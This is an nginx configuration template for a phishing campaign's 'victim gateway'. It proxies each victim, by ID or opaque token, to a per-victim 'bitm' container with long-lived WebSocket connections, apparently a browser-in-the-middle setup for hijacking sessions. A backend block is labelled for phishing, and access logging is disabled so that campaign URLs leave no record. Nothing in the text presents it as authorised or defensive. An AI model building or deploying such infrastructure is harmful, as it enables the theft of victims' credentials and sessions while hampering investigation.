worker_processes 1;

error_log /dev/stderr warn;
pid        /tmp/nginx/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    resolver 127.0.0.11 valid=10s ipv6=off;

    map $http_upgrade $connection_upgrade {
        default upgrade;
        ''      close;
    }

    map $http_x_forwarded_proto $forwarded_proto {
        default $http_x_forwarded_proto;
        ''      $scheme;
    }

    map $uri $gateway_victim_path {
        default /;
        "~^/v/[0-9a-f]{8}(?<gateway_path>/.*)$" $gateway_path;
        "~^/STREAM_PATH/[A-Za-z0-9_-]{16,64}(?<opaque_gateway_path>/.*)$" $opaque_gateway_path;
    }

    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';

    # Public URLs can contain short-lived campaign capabilities. Do not persist
    # request targets in the campaign gateway logs.
    access_log off;

    sendfile on;
    keepalive_timeout 65;
    client_body_temp_path /tmp/nginx/client_temp;
    proxy_temp_path /tmp/nginx/proxy_temp;
    fastcgi_temp_path /tmp/nginx/fastcgi_temp;
    uwsgi_temp_path /tmp/nginx/uwsgi_temp;
    scgi_temp_path /tmp/nginx/scgi_temp;

    # HTTP server
    server {
        listen 8081;
        server_name _;
        client_max_body_size 2m;

        ####################################
        # Campaign-scoped victim gateway
        ####################################
        location ~ "^/STREAM_PATH/(?<bootstrap_route>[A-Za-z0-9_-]{16,64})/access/(?<bootstrap_token>[A-Za-z0-9_-]{32,128})$" {
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $forwarded_proto;
            proxy_pass http://127.0.0.1:8443/internal/gateway/stream-bootstrap/$bootstrap_route/$bootstrap_token;
        }

        location ~ "^/STREAM_PATH/(?<opaque_route>[A-Za-z0-9_-]{16,64})(?:/|$)" {
            set $gateway_stream_route $opaque_route;
            auth_request /_gateway/session-auth;
            auth_request_set $gateway_victim_id $upstream_http_x_bitm_victim_id;

            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $forwarded_proto;
            proxy_buffering off;
            proxy_request_buffering off;
            proxy_read_timeout 1d;
            proxy_send_timeout 1d;
            # Evaluate the victim ID after auth_request has populated it.
            proxy_pass http://p-bitm-CAMPAIGN_ID-$gateway_victim_id:8443$gateway_victim_path$is_args$args;
        }

        location ~ "^/v/(?<route_victim_id>[0-9a-f]{8})(?:/|$)" {
            # Persist the main-request capture so the auth subrequest can use it.
            set $gateway_victim_id $route_victim_id;
            auth_request /_gateway/session-auth;

            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $forwarded_proto;

            proxy_buffering off;
            proxy_request_buffering off;
            proxy_read_timeout 1d;
            proxy_send_timeout 1d;

            proxy_pass http://p-bitm-CAMPAIGN_ID-$gateway_victim_id:8443$gateway_victim_path$is_args$args;
        }

        location = /_gateway/session-auth {
            internal;
            proxy_pass http://127.0.0.1:8443/internal/gateway/session-auth;
            proxy_pass_request_body off;
            proxy_set_header Content-Length "";
            proxy_set_header X-Victim-ID $gateway_victim_id;
            proxy_set_header X-Stream-Route $gateway_stream_route;
            proxy_set_header X-Gateway-Auth GATEWAY_AUTH_KEY;
            proxy_set_header X-Stream-Access $cookie_STREAM_COOKIE_NAME;
        }

        ####################################
        # Backend FastAPI/Flask (API + Phishing + WebSocket)
        ####################################
        location / {
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection $connection_upgrade;

            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $forwarded_proto;

            proxy_pass http://127.0.0.1:8443;
        }

    }
}
